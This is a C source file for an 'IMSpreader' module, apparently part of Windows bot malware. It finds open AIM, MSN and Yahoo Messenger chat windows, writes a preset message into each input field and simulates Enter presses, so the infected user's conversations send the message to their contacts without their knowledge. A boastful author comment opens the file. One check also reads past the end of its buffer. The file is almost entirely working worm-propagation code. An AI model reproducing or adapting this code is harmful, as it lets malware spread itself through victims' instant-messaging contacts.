/*
  You see, people, i'm Nathan and I'm elite.
  Could you fix this shit?  No...  I doubt it.
  Eat it.
  -------------------------------------------
  IMSpreader fixed by Nathan
*/

#ifndef NO_IMSPREAD

#include "includes.h"
#include "functions.h"
#include "externs.h"

#define CLASS_SIZE 500

BOOL CALLBACK EnumAIMChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	char IMText[55];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"Ate32Class"))
	{
		SendMessage(hwnd,WM_GETTEXT,sizeof(IMText),(LPARAM)IMText);
		if(IMText[55]=='E'||IMText[0]!='<')
		{
			SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)IMmsg); 
			SendMessage(hwnd,WM_KEYDOWN,VK_F23,0);
			SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
			SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
			SendMessage(hwnd,WM_KEYUP,VK_F23,0);
		}
	}
	return true;
}

BOOL CALLBACK EnumAIM(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"AIM_IMessage"))
		EnumChildWindows(hwnd,EnumAIMChild,0);
	return true;
}

BOOL CALLBACK EnumMSNChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	char IMText[8];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"RichEdit20W"))
	{
		SendMessage(hwnd,WM_GETTEXT,sizeof(IMText),(LPARAM)IMText);
		SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)IMmsg); 
		SendMessage(hwnd,WM_KEYDOWN,VK_F23,0);
		SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
		SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
		SendMessage(hwnd,WM_KEYUP,VK_F23,0);
	}
	return true;
}


BOOL CALLBACK EnumMSN(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"IMWindowClass"))
		EnumChildWindows(hwnd,EnumMSNChild,0);
	return true;
}

BOOL CALLBACK EnumYahooChild(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"RichEdit20A"))
	{
		SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)IMmsg); 
		SendMessage(hwnd,WM_KEYDOWN,VK_RETURN,0);
		SendMessage(hwnd,WM_KEYUP,VK_RETURN,0);
	}
	return true;
}


BOOL CALLBACK EnumYahoo(HWND hwnd, LPARAM lParam) 
{
	char ClassName[255];
	if (!GetClassName(hwnd,ClassName,sizeof(ClassName)))
		return false;
	if(!strcmp(ClassName,"IMClass"))
		EnumChildWindows(hwnd,EnumYahooChild,0);
	return true;
}
#endif